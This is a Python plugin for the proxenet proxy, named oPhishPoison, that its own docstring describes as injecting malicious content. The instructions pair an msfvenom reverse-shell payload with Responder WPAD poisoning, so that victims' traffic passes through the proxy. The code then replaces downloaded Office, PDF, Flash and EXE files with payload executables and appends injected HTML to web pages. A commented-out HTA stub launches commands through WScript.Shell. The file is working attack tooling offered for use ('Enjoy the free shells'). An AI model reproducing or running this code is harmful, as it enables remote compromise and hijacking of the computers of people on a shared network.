"""
This script will inject malicious content.

How to use:
- Generate your custom payload using msfvenom
  ex: $ msfvenom -p windows/reverse_tcp_shell -f raw -b '\x0d\x0a\x00\xff' -o mypayload LHOST=192.168.56.1 LPORT=4444
- Edit your proxenet config file to point to your payload (option 'msfpayload')
- Start proxenet and load this script (autoload or manually)
  ex: $ ln -sf proxenet-plugins/oPhishPoison.py proxenet-plugins/autoload/oPhishPoison.py
      $ ./proxenet -b 192.168.56.1 -p 8008
- Start Responder and point WPAD to proxenet
  ex: # ./Responder.py -v -I vboxnet0 -u 192.168.56.1:8008
- Enjoy the free shells

"""

PLUGIN_NAME   = "oPhishPoison"
AUTHOR        = "@_hugsy_"


import os, subprocess, ConfigParser, re, base64
from pimp import HTTPRequest, HTTPResponse, HTTPBadResponseException

HOME = os.getenv( "HOME" )
CONFIG_FILE = os.getenv("HOME") + "/.proxenet.ini"

try:
    config = ConfigParser.ConfigParser()
    config.read(CONFIG_FILE)
    path_to_msfpayload   = config.get(PLUGIN_NAME, "msfpayload", 0, {"home": os.getenv("HOME")})
    path_to_python       = config.get(PLUGIN_NAME, "python", 0, {"home": os.getenv("HOME")})
    path_to_xor_payload  = config.get(PLUGIN_NAME, "xor_payload", 0, {"home": os.getenv("HOME")})
    path_to_html         = config.get(PLUGIN_NAME, "html_inject_stub", 0, {"home": os.getenv("HOME")})
except Exception as e:
    print("[-] Plugin '%s' cannot be loaded: %s" % (PLUGIN_NAME, e))
    exit(1)

file_cache = { "html": path_to_html, }
q = {}
types = {"docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
         "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
         "pptx": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
         "doc": "application/msword",
         "xls": "application/msexcel",
         "ppt": "application/vnd.ms-powerpoint",
         "pdf": "application/pdf",
         "swf": "application/x-shockwave-flash",
         "exe": "application/x-msdos-program",
         "html": "text/html",
         }


def is_supported_type(t):
    """
    Checks if the content type is supported by our poisoining plugins. If not, the request will
    not be tampered.
    """
    for k,v in types.iteritems():
        if v.lower() == t.lower():  return k
    return None


def hit_cache(ctype):
    """
    Tried to get the right file from the cache.
    """
    res = file_cache.get(ctype, None)
    if res is None:
        return False

    if not os.access(res, os.R_OK):
        return False

    return res


def replace_with_malicious(http, ctype):
    """
    1. generate on-the-fly the right payload
    2. replace the HTTP response body
    3. profit
    """
    global q

    # 1.
    res = hit_cache(ctype)
    if res == False:
        try:
            cmd = "{python} {xor} --quiet".format(python=path_to_python, xor=path_to_xor_payload)
            if   ctype in ("xslx", "xls"):  cmd += " --excel"
            elif ctype in ("docx", "doc"):  cmd += " --word"
            elif ctype in ("pptx", "ppt"):  cmd += " --powerpoint"
            elif ctype == "pdf":            cmd += " --pdf"
            elif ctype == "swf":            cmd += " --flash"

            with open(path_to_msfpayload, "rb") as f:
                res = subprocess.check_output(cmd.split(" "), stdin=f)
                if res is None or len(res)==0:
                    raise Exception("check_output() failed")

                res = res.strip()

            file_cache[ctype] = res

        except Exception as e:
            print("Payload generation failed for '%s': %s" % (ctype, e))
            return False

    # 2.
    with open(res, "rb") as f:
        data = f.read()
        http.body = data

    if http.rid in q.keys():
        fname = q[http.rid]
        del q[http.rid]
    else:
        fname = "attachement.{}".format(ctype)

    http.del_header("Content-Disposition")
    http.add_header("Content-Disposition", "inline; filename={}.exe".format(fname))

    # injecting hta test
    # http.body = """<html><head>
    # <hta:application id="Service Interrupts" showintaskbar="no" sysmenu="no" border="none" </head>
    # <body><script language="JScript">
    # function Window_onLoad(){
	# new ActiveXObject('WScript.Shell').Run('cmd.exe /c calc.exe'); window.resizeTo(1,1);
    # }
    # window.onload=Window_onLoad; </script></body></html>"""

    # changing content-type
    # http.del_header("Content-Type")
    # http.add_header("Content-Type", "text/hta")

    # changing content-disposition
    # http.del_header("Content-Disposition")
    # http.add_header("Content-Disposition", "inline; filename={}.hta".format(fname))

    # 3.
    return True


def inject_html(http):
    """
    Do the same than replace_with_malicious() but with HTML content.
    The payload will be appended at the end of the <body> (i.e. right before </body>),
    and render the new content to the browser.
    """
    res = hit_cache("html")
    if res == False:
        return False

    with open(res, "rb") as f:
        html_to_inject = f.read()

    if len(html_to_inject) == 0:
        return False

    new = re.sub(r"(</body>)",
                 r"%s\1" % html_to_inject,
                 http.body,
                 flags=re.IGNORECASE)

    if new == http.body:
        # if here, means http response is chunked, so just append it
        http.body += html_to_inject
    else:
        http.body = new

    http.del_header("Content-Encoding")
    print("Injecting HTML content into response {rid:d}".format(rid=http.rid))
    return http.render()


def proxenet_request_hook(rid, request, uri):
    """
    proxenet_request_hook() is not useful now, maybe later.
    """
    global q

    q[rid] = HTTPRequest(request, rid=rid).basename
    return request


def proxenet_response_hook(rid, response, uri):
    """
    When a HTTP response header is received, check if it has a supported content type.
    If so, inject our payload.
    """
    try:
        http = HTTPResponse(response, rid=rid)

        if not http.has_header("Content-Type"):
            del(http)
            return response

        detected_type = is_supported_type( http.get_header("Content-Type") )
        if detected_type is None:
            del(http)
            return response

        if detected_type == "html":
            res = inject_html(http)
            if  res == False:
                del(http)
                return response
            else:
                return res

        if replace_with_malicious(http, detected_type) == False:
            del(http)
            return response

        print("Poisoining response {rid:d} with format '{fmt:s}'".format(rid=rid, fmt=detected_type))
        return http.render()

    except HTTPBadResponseException as e :
        # print(e)
        return response


if __name__ == "__main__":
    pass
